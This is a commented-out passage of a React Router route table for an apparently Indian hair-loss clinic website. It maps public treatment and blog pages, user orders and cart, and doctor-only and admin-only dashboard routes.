//                 />
//               }
//             />
//             <Route
//               path="/hair-loss-treatment-experts-dermatologists"
//               element={<OurSpecialistsPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/our-expertise"
//               element={<OurExpertisePage setTitle={setTitle} />}
//             />
//             <Route
//               path="/user-profile"
//               element={<MyReportsPages setTitle={setTitle} />}
//             />
//             <Route
//               path="/user-profile/:id"
//               element={<UserProfilePage setTitle={setTitle} />}
//             />
//             <Route
//               path="/unauthorized"
//               element={<Unauthorized setTitle={setTitle} />}
//             />
//             <Route
//               path="/take-hair-test"
//               element={<HairTestPage setTitle={setTitle} />}
//             />

//             <Route
//               path="/doctor/report/:id"
//               element={<Report setTitle={setTitle} />}
//             />
//             <Route
//               path="/doctor-analyse-report/:id"
//               element={<DoctorAnalyseReport setTitle={setTitle} />}
//             />
//             <Route path="/address" element={<Address setTitle={setTitle} />} />
//             <Route
//               path="management-report/:id"
//               element={<ManagementReport setTitle={setTitle} />}
//             />
//             <Route
//               path="my-orders"
//               element={<MyOrders setTitle={setTitle} />}
//             />
//             <Route
//               path="create-order"
//               element={<CreateOrder setTitle={setTitle} />}
//             />
//             <Route
//               path="cart"
//               element={
//                 <Cart setTitle={setTitle} cart={cart} setCart={setCart} />
//               }
//             />
//             <Route
//               path="coupon"
//               element={
//                 <Coupons setTitle={setTitle} cart={cart} setCart={setCart} />
//               }
//             />

//             <Route
//               path="hair-loss-women-causes-treatments-remedies"
//               element={
//                 <HairTreatmentWomen
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="effective-hair-loss-treatment-men"
//               element={
//                 <HairTreatmentMen
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="hair-transplants-fue-dhi-mhi-natural-restoration"
//               element={
//                 <HairTransplant
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="advanced-hair-loss-solutions-prp-smp-cloning-systems"
//               element={
//                 <OtherProcedure
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />

//             <Route
//               path="online-hair-loss-test-diagnosis-treatment"
//               element={
//                 <OnlineHairTest
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="dr-amit-agarkar-hair-restoration-expert"
//               element={
//                 <Dermatologist
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="online-hair-loss-treatment-bangalore"
//               element={
//                 <BangaloreHairTreatmentPage
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="online-hair-loss-treatment-delhi"
//               element={
//                 <DelhiHairTreatmentPage
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/hair-care-blogs"
//               element={
//                 <BangaloreHairTreatmentPage
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/hair-care-blogs"
//               element={
//                 <AllBlogs
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                   desc={desc}
//                   setDesc={setDesc}
//                 />
//               }
//             />
//             <Route
//               exact
//               path="/hair-care-blogs/:id1/:id"
//               element={
//                 <Blog
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                   desc={desc}
//                   setDesc={setDesc}
//                 />
//               }
//             />
//             <Route
//               exact
//               path="/hair-care-blogs/:id1"
//               element={
//                 <AllBlogs
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                   desc={desc}
//                   setDesc={setDesc}
//                 />
//               }
//             />

//             <Route path="/invoiceView/:id" element={<InvoiceView />} />

//             <Route element={<RoleBasedRoutes allowedRoles={["doctor"]} />}>
//               <Route path="/doctor-dashboard" element={<DoctorDashboard />} />
//               <Route path="/patient-list" element={<PatientList />} />
//               <Route path="/appointment" element={<AppointmentList />} />
//               <Route
//                 path="/patient-test-result/:id"
//                 element={<PatientTestResult />}
//               />
//               <Route path="/analysis/:id" element={<Analysis />} />
//             </Route>

//             <Route element={<RoleBasedRoutes allowedRoles={["admin"]} />}>
//               <Route path="/admin-dashboard" element={<AdminDashboard />} />
//               <Route
//                 path="/pending-appointments"
//                 element={<PendingDashboard />}
//               />
//               <Route path="/all-patient-list" element={<AllPatientList />} />
//               <Route path="/test-result/:id" element={<TestResults />} />
//               <Route
//                 path="/pending-test-result/:id"
//                 element={<PendingTestResults />}
//               />

//               <Route
//                 path="/assign-appointment"
//                 element={<AssignAppointment />}
//               />
//               <Route path="/add-doctor" element={<AddDoctor />} />
//               <Route path="/edit-doctor/:id" element={<EditDoctor />} />
//               <Route path="/all-doctor" element={<AllDoctorList />} />
//               <Route path="/all-hair-test-result" element={<AllHairTest />} />
//               <Route path="/manage-website" element={<ManageWebsite />} />
//               <Route
//                 path="/all-contact-us-form-result"
//                 element={<AllContactUs />}
//               />
//               <Route path="/reviews" element={<AllReviews />} />

//               <Route path="/add-product" element={<AddProduct />} />
//               <Route
//                 path="/edit-delete-product"
//                 element={<EditDeleteProduct />}
//               />
//               <Route path="/manage-order" element={<ManageOrder />} />
//               <Route path="/all-coupons" element={<AllCoupons />} />
//             </Route>
//             <Route path="*" element={<ErrorPage />} />
//           </Routes>
//         </Router> */}
